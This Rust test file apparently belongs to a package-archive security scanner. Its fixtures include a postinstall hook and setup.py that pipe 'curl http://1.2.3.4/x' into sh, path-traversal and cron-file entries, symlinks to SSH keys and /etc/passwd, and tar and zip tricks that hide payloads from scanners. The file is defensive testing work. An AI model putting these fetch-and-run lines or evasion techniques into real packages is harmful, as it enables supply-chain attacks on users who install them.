mod common;

use common::*;
use customs_scan::{scan_archive, Ecosystem, ScanError, ScanOptions};

fn scan(
    bytes: &[u8],
    name: &str,
    opts: &ScanOptions,
) -> Result<customs_scan::ScanReport, ScanError> {
    scan_archive(bytes, name, None, opts)
}

#[test]
fn traversal_and_absolute_entries_are_skipped() {
    let bytes = tar_gz(&[
        TarItem::File("pkg-1.0/setup.py", b"print('hi')\n"),
        TarItem::RawPath("pkg-1.0/../../escape.py", b"import os\nos.system('id')\n"),
        TarItem::RawPath("/etc/cron.d/evil", b"* * * * * root id\n"),
    ]);
    let r = scan(&bytes, "pkg-1.0.tar.gz", &ScanOptions::default()).unwrap();
    assert_eq!(r.features["n_unsafe_paths"], 2.0);
    assert_eq!(r.features["n_files"], 1.0);
    assert_eq!(r.features["all_proc_exec"], 0.0);
    assert!(r.errors.iter().any(|e| e.contains("unsafe path")));
}

#[test]
fn zip_traversal_entry_is_skipped() {
    let bytes = zip_files(&[
        ("pkg/__init__.py", b"x = 1\n"),
        ("../evil.py", b"eval(x)\n"),
    ]);
    let r = scan(&bytes, "pkg-1.0-py3-none-any.whl", &ScanOptions::default()).unwrap();
    assert_eq!(r.features["n_unsafe_paths"], 1.0);
    assert_eq!(r.features["all_dyn_code"], 0.0);
}

#[test]
fn symlinks_and_hardlinks_are_not_followed() {
    let bytes = tar_gz(&[
        TarItem::File("pkg-1.0/setup.py", b"x = 1\n"),
        TarItem::Symlink("pkg-1.0/creds", "/home/user/.ssh/id_rsa"),
        TarItem::HardLink("pkg-1.0/passwd", "/etc/passwd"),
    ]);
    let r = scan(&bytes, "pkg-1.0.tar.gz", &ScanOptions::default()).unwrap();
    assert_eq!(r.features["n_links"], 2.0);
    assert_eq!(r.features["n_files"], 1.0);

    let z = zip_with_symlink("/etc/passwd");
    let r = scan(&z, "pkg-1.0-py3-none-any.whl", &ScanOptions::default()).unwrap();
    assert_eq!(r.features["n_links"], 1.0);
}

#[test]
fn oversized_entry_is_counted_but_not_analyzed() {
    let big = format!("import os\n{}", "os.system('x')\n".repeat(200));
    let bytes = tar_gz_files(&[
        ("pkg-1.0/setup.py", "x = 1\n"),
        ("pkg-1.0/pkg/big.py", &big),
    ]);
    let opts = ScanOptions {
        max_entry_bytes: 1000,
        ..Default::default()
    };
    let r = scan(&bytes, "pkg-1.0.tar.gz", &opts).unwrap();
    assert_eq!(r.features["n_files"], 2.0);
    assert_eq!(r.features["max_file_bytes"], big.len() as f64);
    assert_eq!(r.features["all_proc_exec"], 0.0);
    assert!(r.errors.iter().any(|e| e.contains("over size cap")));
}

#[test]
fn oversized_code_is_reported_as_unread() {
    let pad = "#".repeat(2000);
    let bytes = tar_gz_files(&[
        (
            "pkg-1.0/setup.py",
            &format!("{pad}\nimport os\nos.system('x')\n"),
        ),
        ("pkg-1.0/bin/tool", &format!("#!/bin/sh\n{pad}")),
        ("pkg-1.0/data/table.json", &format!("[\"{pad}\"]")),
        ("pkg-1.0/docs/notes.txt", &pad),
        ("pkg-1.0/pkg/__init__.py", "x = 1\n"),
    ]);
    let opts = ScanOptions {
        max_entry_bytes: 1000,
        ..Default::default()
    };
    let r = scan(&bytes, "pkg-1.0.tar.gz", &opts).unwrap();
    // Paths are relative to the package root, like evidence paths.
    assert_eq!(r.unread_code, vec!["setup.py", "bin/tool"]);
    assert_eq!(r.features["inst_proc_exec"], 0.0);

    let r = scan(&bytes, "pkg-1.0.tar.gz", &ScanOptions::default()).unwrap();
    assert!(r.unread_code.is_empty());
    assert!(r.features["inst_proc_exec"] > 0.0);
}

#[test]
fn tar_gz_bomb_is_rejected() {
    let zeros = vec![b' '; 40 * 1024 * 1024];
    let bytes = tar_gz(&[TarItem::File("pkg-1.0/data.txt", &zeros)]);
    assert!(bytes.len() < 200 * 1024, "fixture should compress well");
    match scan(&bytes, "pkg-1.0.tar.gz", &ScanOptions::default()) {
        Err(ScanError::Rejected(msg)) => assert!(msg.contains("ratio"), "{msg}"),
        other => panic!("expected rejection, got {other:?}"),
    }
}

#[test]
fn zip_bomb_is_rejected() {
    let zeros = vec![0u8; 40 * 1024 * 1024];
    let bytes = zip_files(&[("pkg/__init__.py", b"x = 1\n"), ("pkg/data.json", &zeros)]);
    match scan(&bytes, "pkg-1.0-py3-none-any.whl", &ScanOptions::default()) {
        Err(ScanError::Rejected(msg)) => assert!(msg.contains("ratio"), "{msg}"),
        other => panic!("expected rejection, got {other:?}"),
    }
}

#[test]
fn total_size_cap_is_enforced() {
    let filler = "a = 1\n".repeat(50_000);
    let bytes = tar_gz_files(&[("pkg-1.0/a.py", &filler), ("pkg-1.0/b.py", &filler)]);
    let opts = ScanOptions {
        max_total_bytes: 400_000,
        ..Default::default()
    };
    assert!(matches!(
        scan(&bytes, "pkg-1.0.tar.gz", &opts),
        Err(ScanError::Rejected(_))
    ));
}

#[test]
fn too_many_entries_is_rejected() {
    let names: Vec<String> = (0..30).map(|i| format!("pkg-1.0/m{i}.py")).collect();
    let files: Vec<(&str, &str)> = names.iter().map(|n| (n.as_str(), "x = 1\n")).collect();
    let opts = ScanOptions {
        max_entries: 10,
        ..Default::default()
    };
    assert!(matches!(
        scan(&tar_gz_files(&files), "pkg-1.0.tar.gz", &opts),
        Err(ScanError::Rejected(_))
    ));
    let zfiles: Vec<(&str, &[u8])> = names
        .iter()
        .map(|n| (n.as_str(), &b"x = 1\n"[..]))
        .collect();
    assert!(matches!(
        scan(&zip_files(&zfiles), "pkg-1.0.zip", &opts),
        Err(ScanError::Rejected(_))
    ));
}

#[test]
fn nested_archive_over_a_limit_is_left_unexpanded() {
    // Installers do not unpack a bundled archive, so one too big to expand must not make
    // the package itself unscannable (cmake's sdist bundles its own source tarball).
    let names: Vec<String> = (0..20).map(|i| format!("src/f{i}.py")).collect();
    let inner_files: Vec<(&str, &[u8])> = names
        .iter()
        .map(|n| (n.as_str(), &b"eval(x)\n"[..]))
        .collect();
    let inner = zip_files(&inner_files);
    let bytes = tar_gz(&[
        TarItem::File("pkg-1.0/setup.py", b"import os\nos.system('id')\n"),
        TarItem::File("pkg-1.0/vendor/src.zip", &inner),
    ]);
    let opts = ScanOptions {
        max_entries: 10,
        ..Default::default()
    };
    let r = scan(&bytes, "pkg-1.0.tar.gz", &opts).unwrap();
    assert_eq!(r.features["n_files"], 2.0);
    assert_eq!(r.features["inst_proc_exec"], 1.0);
    assert_eq!(r.features["all_dyn_code"], 0.0);
    assert!(
        r.errors
            .iter()
            .any(|e| e.starts_with("nested archive not expanded (archive has more than 10")),
        "{:?}",
        r.errors
    );
    // The outer archive itself over the limit is still rejected.
    let outer: Vec<(&str, &str)> = names.iter().map(|n| (n.as_str(), "x = 1\n")).collect();
    assert!(matches!(
        scan(&tar_gz_files(&outer), "pkg-1.0.tar.gz", &opts),
        Err(ScanError::Rejected(_))
    ));
}

#[test]
fn nested_archives_are_expanded_to_the_depth_cap() {
    let inner2 = zip_files(&[("deep.py", b"eval(x)\n")]);
    let inner = zip_files(&[
        ("payload.py", b"import os\nos.system('id')\n"),
        ("deeper.zip", &inner2),
    ]);
    let bytes = tar_gz(&[
        TarItem::File("pkg-1.0/setup.py", b"x = 1\n"),
        TarItem::File("pkg-1.0/data/blob.zip", &inner),
    ]);
    let r = scan(&bytes, "pkg-1.0.tar.gz", &ScanOptions::default()).unwrap();
    // Depth 1 is expanded and counts toward the all_ surface only.
    assert_eq!(r.features["all_proc_exec"], 1.0);
    assert_eq!(r.features["inst_proc_exec"], 0.0);
    // Depth 2 is not expanded.
    assert_eq!(r.features["all_dyn_code"], 0.0);
    assert!(r
        .errors
        .iter()
        .any(|e| e.contains("nested archive not expanded")));

    let opts = ScanOptions {
        max_nesting_depth: 0,
        ..Default::default()
    };
    let r = scan(&bytes, "pkg-1.0.tar.gz", &opts).unwrap();
    assert_eq!(r.features["all_proc_exec"], 0.0);
}

#[test]
fn bzip2_and_lzma_wheel_entries_are_read() {
    // Python's zipfile reads both, so pip installs such wheels. The zip crate cannot
    // write LZMA, so that wheel was written by zipfile.ZIP_LZMA.
    let bzip2 = zip_with_method(
        &[
            ("demo/__init__.py", b"import os\nos.system('x')\n"),
            ("demo-1.0.dist-info/METADATA", b"Name: demo\nVersion: 1.0\n"),
        ],
        zip::CompressionMethod::Bzip2,
    );
    let lzma = include_bytes!("fixtures/lzma-demo-1.0-py3-none-any.whl").to_vec();
    for (what, bytes) in [("bzip2", bzip2), ("lzma", lzma)] {
        let r = scan(&bytes, "demo-1.0-py3-none-any.whl", &ScanOptions::default()).unwrap();
        assert!(r.unread_code.is_empty(), "{what}: {:?}", r.errors);
        assert!(r.errors.is_empty(), "{what}: {:?}", r.errors);
        assert!(r.features["all_proc_exec"] > 0.0, "{what}");
    }
}

#[test]
fn unreadable_code_entries_are_reported_as_unread() {
    // Zstandard (93) is a method Python 3.14's zipfile reads and this scanner does not;
    // pip would install the module the scanner skipped.
    let files: &[(&str, &[u8])] = &[
        ("demo/__init__.py", b"x = 1\n"),
        ("demo/hidden.py", b"import os\nos.system('x')\n"),
        ("demo/data.bin", b"\x00\x01"),
        ("demo/fixtures/broken.zip", b"PK"),
        ("demo-1.0.dist-info/METADATA", b"Name: demo\nVersion: 1.0\n"),
    ];
    let bytes = zip_claiming_method(
        files,
        &[
            "demo/hidden.py",
            "demo/data.bin",
            "demo/fixtures/broken.zip",
        ],
        93,
    );
    let r = scan(&bytes, "demo-1.0-py3-none-any.whl", &ScanOptions::default()).unwrap();
    assert_eq!(r.unread_code, vec!["demo/hidden.py"]);
    assert!(
        r.errors.iter().any(|e| e.contains("demo/hidden.py")),
        "{:?}",
        r.errors
    );

    // Inside a zip sdist the wrapper directory is stripped from the reported path too.
    let files: &[(&str, &[u8])] = &[
        ("demo-1.0/PKG-INFO", b"Name: demo\nVersion: 1.0\n"),
        ("demo-1.0/setup.py", BENIGN_SETUP_PY.as_bytes()),
        ("demo-1.0/demo/hidden.py", b"x = 1\n"),
    ];
    let bytes = zip_claiming_method(files, &["demo-1.0/demo/hidden.py"], 93);
    let r = scan(&bytes, "demo-1.0.zip", &ScanOptions::default()).unwrap();
    assert_eq!(r.unread_code, vec!["demo/hidden.py"]);

    // A nested archive's unreadable code is not reported: installers do not unpack it.
    let inner = zip_claiming_method(&[("x/hidden.py", b"x = 1\n")], &["x/hidden.py"], 93);
    let bytes = tar_gz(&[
        TarItem::File("demo-1.0/setup.py", BENIGN_SETUP_PY.as_bytes()),
        TarItem::File("demo-1.0/tests/data/fixture.zip", &inner),
    ]);
    let r = scan(&bytes, "demo-1.0.tar.gz", &ScanOptions::default()).unwrap();
    assert!(r.unread_code.is_empty(), "{:?}", r.unread_code);
}

#[test]
fn tar_corrupt_after_the_first_entry_is_rejected() {
    // node-tar skips a header with a bad checksum and keeps extracting, so what follows
    // it may be installed while the scanner stopped reading.
    let mut tar = tar_bytes(&[
        TarItem::File(
            "package/package.json",
            br#"{"name":"demo","version":"1.0.0"}"#,
        ),
        TarItem::File("package/index.js", b"module.exports = 1;\n"),
    ]);
    // Second header starts after the first header and its one data block.
    tar[1024 + 148] ^= 0x01;
    let r = scan(&gz(&tar), "demo-1.0.0.tgz", &ScanOptions::default());
    assert!(
        matches!(&r, Err(ScanError::Rejected(m)) if m.contains("after the first entry")),
        "{r:?}"
    );
    // The same damage inside a nested archive is only recorded.
    let bytes = tar_gz(&[
        TarItem::File(
            "package/package.json",
            br#"{"name":"demo","version":"1.0.0"}"#,
        ),
        TarItem::File("package/test/fixture.tar", &tar),
    ]);
    let r = scan(&bytes, "demo-1.0.0.tgz", &ScanOptions::default()).unwrap();
    assert!(
        r.errors.iter().any(|e| e.contains("truncated or corrupt")),
        "{:?}",
        r.errors
    );
}

#[test]
fn garbage_input_is_an_error_not_a_panic() {
    assert!(matches!(
        scan(
            b"definitely not an archive",
            "x.tar.gz",
            &ScanOptions::default()
        ),
        Err(ScanError::UnsupportedFormat(_))
    ));
    let mut truncated = benign_sdist();
    truncated.truncate(truncated.len() / 3);
    // Either a partial report with an error, or a rejection; never a panic.
    if let Ok(r) = scan(&truncated, "demo-1.0.0.tar.gz", &ScanOptions::default()) {
        assert!(!r.errors.is_empty());
    }
    let mut bad_zip = benign_wheel();
    let n = bad_zip.len();
    bad_zip[n / 2..].fill(0);
    let _ = scan(
        &bad_zip,
        "demo-1.0.0-py3-none-any.whl",
        &ScanOptions::default(),
    );
}

#[test]
fn bzip2_sdist_is_supported() {
    use std::io::Write;
    let tar = tar_bytes(&[TarItem::File(
        "demo-1.0/setup.py",
        BENIGN_SETUP_PY.as_bytes(),
    )]);
    let mut enc = bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
    enc.write_all(&tar).unwrap();
    let bytes = enc.finish().unwrap();
    let r = scan(&bytes, "demo-1.0.tar.bz2", &ScanOptions::default()).unwrap();
    assert_eq!(r.ecosystem, Ecosystem::Pypi);
    assert_eq!(r.install_surface, vec!["setup.py"]);
}

// Entries an installer extracts but the scanner does not read the way the installer does.
// None of these may change the model inputs (features, tokens); they are reported through
// `unread_code`, which blocks by default, or as a rejection.

fn scan_eco(bytes: &[u8], name: &str, eco: Ecosystem) -> customs_scan::ScanReport {
    scan_archive(bytes, name, Some(eco), &ScanOptions::default()).unwrap()
}

const PJ_BENIGN: &[u8] = br#"{"name":"a","version":"1.0.0"}"#;
const PJ_HOOK: &[u8] =
    br#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"curl http://1.2.3.4/x | sh"}}"#;

#[test]
fn duplicate_root_manifest_is_unread() {
    // node-tar (and pip) keep the last copy of a path; the scanner reads the first.
    let bytes = tar_gz(&[
        TarItem::File("package/package.json", PJ_BENIGN),
        TarItem::File("package/index.js", b"module.exports=1\n"),
        TarItem::File("package/package.json", PJ_HOOK),
    ]);
    let r = scan_eco(&bytes, "a-1.0.0.tgz", Ecosystem::Npm);
    assert_eq!(r.features["n_npm_install_scripts"], 0.0);
    assert_eq!(
        r.unread_code,
        vec!["package.json (duplicate entry; installers keep the last copy)"]
    );

    let bytes = tar_gz(&[
        TarItem::File("p-1.0/PKG-INFO", b"Name: p\nVersion: 1.0\n"),
        TarItem::File("p-1.0/setup.py", b"from setuptools import setup\nsetup()\n"),
        TarItem::File("p-1.0/setup.py", b"import os\nos.system('id')\n"),
    ]);
    let r = scan_eco(&bytes, "p-1.0.tar.gz", Ecosystem::Pypi);
    assert_eq!(r.features["inst_proc_exec"], 0.0);
    assert_eq!(
        r.unread_code,
        vec!["setup.py (duplicate entry; installers keep the last copy)"]
    );
}

#[test]
fn identical_duplicates_are_not_flagged() {
    let bytes = tar_gz(&[
        TarItem::File("package/package.json", PJ_BENIGN),
        TarItem::File("package/package.json", PJ_BENIGN),
        TarItem::File("package/README.md", b"a\n"),
        TarItem::File("package/README.md", b"b\n"),
    ]);
    let r = scan_eco(&bytes, "a-1.0.0.tgz", Ecosystem::Npm);
    assert!(r.unread_code.is_empty(), "{:?}", r.unread_code);
}

#[test]
fn npm_second_top_dir_manifest_is_unread() {
    // pacote extracts with strip:1 on every entry, so `zzz/package.json` lands on the
    // root manifest after `package/package.json`.
    let bytes = tar_gz(&[
        TarItem::File("package/package.json", PJ_BENIGN),
        TarItem::File("zzz/package.json", PJ_HOOK),
    ]);
    let r = scan_eco(&bytes, "a-1.0.0.tgz", Ecosystem::Npm);
    assert_eq!(r.features["n_npm_install_scripts"], 0.0);
    assert_eq!(
        r.unread_code,
        vec!["package.json (npm extracts a different file than the scanner read)"]
    );
}

#[test]
fn npm_single_package_dir_is_not_flagged() {
    for bytes in [benign_npm(), malicious_npm()] {
        let r = scan_eco(&bytes, "a-1.0.0.tgz", Ecosystem::Npm);
        assert!(r.unread_code.is_empty(), "{:?}", r.unread_code);
    }
    // Any single top-level directory is stripped the same way by both.
    let bytes = tar_gz(&[
        TarItem::File("node-a/package.json", PJ_HOOK),
        TarItem::File("node-a/lib/x.js", b"1\n"),
    ]);
    let r = scan_eco(&bytes, "a-1.0.0.tgz", Ecosystem::Npm);
    assert!(r.unread_code.is_empty(), "{:?}", r.unread_code);
    assert_eq!(r.features["n_npm_install_scripts"], 1.0);
}

#[test]
fn tar_entries_after_a_zero_block_are_rejected() {
    let tar = tar_with_zero_block(
        &[TarItem::File("package/package.json", PJ_BENIGN)],
        &[TarItem::File("package/package.json", PJ_HOOK)],
    );
    for bytes in [gz(&tar), tar.clone()] {
        match scan(&bytes, "a-1.0.0.tgz", &ScanOptions::default()) {
            Err(ScanError::Rejected(m)) => assert!(m.contains("end-of-archive"), "{m}"),
            other => panic!("expected rejection, got {other:?}"),
        }
    }
    // Junk blocks between the zero block and the hidden header do not help: node-tar
    // skips them one block at a time.
    let mut t = tar_bytes(&[TarItem::File("package/package.json", PJ_BENIGN)]);
    t.truncate(t.len() - 1024);
    t.extend([0u8; 512]);
    t.extend([b'j'; 1024]);
    t.extend(tar_bytes(&[TarItem::File("package/package.json", PJ_HOOK)]));
    assert!(matches!(
        scan(&gz(&t), "a-1.0.0.tgz", &ScanOptions::default()),
        Err(ScanError::Rejected(_))
    ));
}

#[test]
fn trailing_zero_padding_is_fine() {
    let mut t = tar_bytes(&[
        TarItem::File("package/package.json", PJ_BENIGN),
        TarItem::File("package/index.js", b"module.exports = 1;\n"),
    ]);
    t.extend(vec![0u8; 20 * 512]);
    let r = scan(&gz(&t), "a-1.0.0.tgz", &ScanOptions::default()).unwrap();
    assert_eq!(r.features["n_files"], 2.0);
    // One zero block and then the end of the stream is also an ending.
    let mut t = tar_bytes(&[TarItem::File("package/package.json", PJ_BENIGN)]);
    t.truncate(t.len() - 512);
    assert!(scan(&gz(&t), "a-1.0.0.tgz", &ScanOptions::default()).is_ok());
    // A nested archive is not checked (installers do not unpack it).
    let inner = tar_with_zero_block(
        &[TarItem::File("x/a.txt", b"a")],
        &[TarItem::File("x/b.txt", b"b")],
    );
    let bytes = tar_gz(&[
        TarItem::File("package/package.json", PJ_BENIGN),
        TarItem::File("package/test/fixture.tar", &inner),
    ]);
    assert!(scan(&bytes, "a-1.0.0.tgz", &ScanOptions::default()).is_ok());
}

#[test]
fn absolute_code_path_is_unread_and_still_counted() {
    // pip strips the leading `/` and extracts the entry; node-tar strips absolute roots.
    let bytes = tar_gz(&[
        TarItem::File("p-1.0/PKG-INFO", b"Name: p\nVersion: 1.0\n"),
        TarItem::RawPath("/p-1.0/setup.py", b"import os\nos.system('id')\n"),
        TarItem::RawPath("/etc/cron.d/evil", b"* * * * * root id\n"),
        TarItem::RawPath("p-1.0/../../escape.py", b"import os\n"),
    ]);
    let r = scan_eco(&bytes, "p-1.0.tar.gz", Ecosystem::Pypi);
    assert_eq!(r.features["n_unsafe_paths"], 3.0);
    assert_eq!(r.features["has_setup_py"], 0.0);
    assert_eq!(
        r.unread_code,
        vec!["setup.py (absolute path; installers strip the root)"]
    );

    let bytes = zip_files(&[
        ("w/core.py", b"x = 1\n"),
        ("w-1.0.dist-info/METADATA", b"Name: w\nVersion: 1.0\n"),
        ("/w/__init__.py", b"import os\nos.system('id')\n"),
        ("C:\\w\\hook.pth", b"import os\n"),
    ]);
    let r = scan_eco(&bytes, "w-1.0-py3-none-any.whl", Ecosystem::Pypi);
    assert_eq!(r.features["n_unsafe_paths"], 2.0);
    assert_eq!(
        r.unread_code,
        vec![
            "w/__init__.py (absolute path; installers strip the root)",
            "w/hook.pth (absolute path; installers strip the root)"
        ]
    );
}

#[test]
fn hardlinked_setup_py_to_payload_is_unread() {
    let bytes = tar_gz(&[
        TarItem::File("p-1.0/PKG-INFO", b"Name: p\nVersion: 1.0\n"),
        TarItem::File(
            "p-1.0/notes.txt",
            b"import os\nos.system('curl http://1.2.3.4/x|sh')\n",
        ),
        TarItem::HardLink("p-1.0/setup.py", "p-1.0/notes.txt"),
    ]);
    let r = scan_eco(&bytes, "p-1.0.tar.gz", Ecosystem::Pypi);
    assert_eq!(r.features["n_links"], 1.0);
    assert_eq!(r.features["inst_proc_exec"], 0.0);
    assert_eq!(
        r.unread_code,
        vec!["setup.py (hardlink to p-1.0/notes.txt; pip extracts the link as a file)"]
    );
    // A symlink in an install-time position is flagged even when its target is source.
    let bytes = tar_gz(&[
        TarItem::File("p-1.0/PKG-INFO", b"Name: p\nVersion: 1.0\n"),
        TarItem::File("p-1.0/tools/build.py", b"x = 1\n"),
        TarItem::Symlink("p-1.0/setup.py", "tools/build.py"),
    ]);
    let r = scan_eco(&bytes, "p-1.0.tar.gz", Ecosystem::Pypi);
    assert_eq!(
        r.unread_code,
        vec!["setup.py (symlink to tools/build.py; pip extracts the link as a file)"]
    );
    // So is a link to a target outside the archive, and a module setup.py imports.
    let bytes = tar_gz(&[
        TarItem::File("p-1.0/PKG-INFO", b"Name: p\nVersion: 1.0\n"),
        TarItem::File("p-1.0/setup.py", b"import helper\nhelper.run()\n"),
        TarItem::File("p-1.0/lib/payload.py", b"import os\nos.system('id')\n"),
        TarItem::Symlink("p-1.0/helper.py", "lib/payload.py"),
        TarItem::Symlink("p-1.0/p/x.py", "/usr/lib/python3/os.py"),
    ]);
    let r = scan_eco(&bytes, "p-1.0.tar.gz", Ecosystem::Pypi);
    assert_eq!(
        r.unread_code,
        vec![
            "helper.py (symlink to lib/payload.py; pip extracts the link as a file)",
            "p/x.py (symlink to /usr/lib/python3/os.py; pip extracts the link as a file)"
        ]
    );
}

#[test]
fn sparse_setup_py_is_unread() {
    let bytes = tar_gz(&[
        TarItem::File("p-1.0/PKG-INFO", b"Name: p\nVersion: 1.0\n"),
        TarItem::Sparse(
            "p-1.0/setup.py",
            b"import os\nos.system('curl http://1.2.3.4/x|sh')\n",
        ),
    ]);
    let r = scan_eco(&bytes, "p-1.0.tar.gz", Ecosystem::Pypi);
    assert_eq!(r.features["n_files"], 1.0);
    assert_eq!(r.features["has_setup_py"], 0.0);
    assert_eq!(
        r.unread_code,
        vec!["setup.py (GNU sparse entry; pip extracts it)"]
    );
}

#[test]
fn symlinked_module_to_scanned_source_is_not_flagged() {
    // Old sdists ship symlinked modules and hardlinked copies of source files.
    let bytes = tar_gz(&[
        TarItem::File("p-1.0/PKG-INFO", b"Name: p\nVersion: 1.0\n"),
        TarItem::File("p-1.0/setup.py", b"from setuptools import setup\nsetup()\n"),
        TarItem::File("p-1.0/p/compat3.py", b"x = 1\n"),
        TarItem::Symlink("p-1.0/p/compat.py", "compat3.py"),
        TarItem::HardLink("p-1.0/docs/conf.py", "p-1.0/p/compat3.py"),
        TarItem::Symlink("p-1.0/LICENSE.txt", "../LICENSE"),
    ]);
    let r = scan_eco(&bytes, "p-1.0.tar.gz", Ecosystem::Pypi);
    assert_eq!(r.features["n_links"], 3.0);
    assert!(r.unread_code.is_empty(), "{:?}", r.unread_code);
}

#[test]
fn npm_links_are_still_just_skipped() {
    // pacote drops every link entry before node-tar sees it.
    let bytes = tar_gz(&[
        TarItem::File("package/package.json", PJ_BENIGN),
        TarItem::File("package/notes.txt", b"require('child_process')\n"),
        TarItem::HardLink("package/index.js", "package/notes.txt"),
        TarItem::Symlink("package/lib.js", "/etc/passwd"),
    ]);
    let r = scan_eco(&bytes, "a-1.0.0.tgz", Ecosystem::Npm);
    assert_eq!(r.features["n_links"], 2.0);
    assert!(r.unread_code.is_empty(), "{:?}", r.unread_code);
}

#[test]
fn zip_symlink_mode_code_entry_is_unread() {
    // pip's wheel installer writes a symlink-mode entry's bytes as a regular file.
    let z = zip_with_symlink_named("w/__init__.py", "import os\nos.system('id')\n");
    let r = scan_eco(&z, "w-1.0-py3-none-any.whl", Ecosystem::Pypi);
    assert_eq!(r.features["n_links"], 1.0);
    assert_eq!(
        r.unread_code,
        vec!["w/__init__.py (zip entry marked as a symlink; pip writes its bytes as a file)"]
    );
    let r = scan_eco(
        &zip_with_symlink("/etc/passwd"),
        "w-1.0-py3-none-any.whl",
        Ecosystem::Pypi,
    );
    assert!(r.unread_code.is_empty(), "{:?}", r.unread_code);
}

#[test]
fn many_rejected_nested_archives_share_one_budget() {
    // Each nested gzip of zeros trips the total cap. Rejected nested work is charged to a
    // budget of its own, so later nested archives are not expanded once it is spent.
    let zeros = vec![0u8; 3 * 1024 * 1024];
    let inner = tar_gz(&[TarItem::File("x/zeros.bin", &zeros)]);
    let names: Vec<String> = (0..8).map(|i| format!("p-1.0/data/n{i}.tar.gz")).collect();
    let mut items = vec![TarItem::File("p-1.0/setup.py", b"x = 1\n")];
    items.extend(names.iter().map(|n| TarItem::File(n, &inner)));
    let bytes = tar_gz(&items);
    let opts = ScanOptions {
        max_total_bytes: 2 * 1024 * 1024,
        max_compression_ratio: 1e9,
        ..Default::default()
    };
    let r = scan(&bytes, "p-1.0.tar.gz", &opts).unwrap();
    let tripped = r
        .errors
        .iter()
        .filter(|e| e.contains("total uncompressed size exceeds cap"))
        .count();
    let skipped = r
        .errors
        .iter()
        .filter(|e| e.contains("work budget for nested archives spent"))
        .count();
    assert!(tripped <= 2, "{:?}", r.errors);
    assert_eq!(tripped + skipped, 8, "{:?}", r.errors);
}
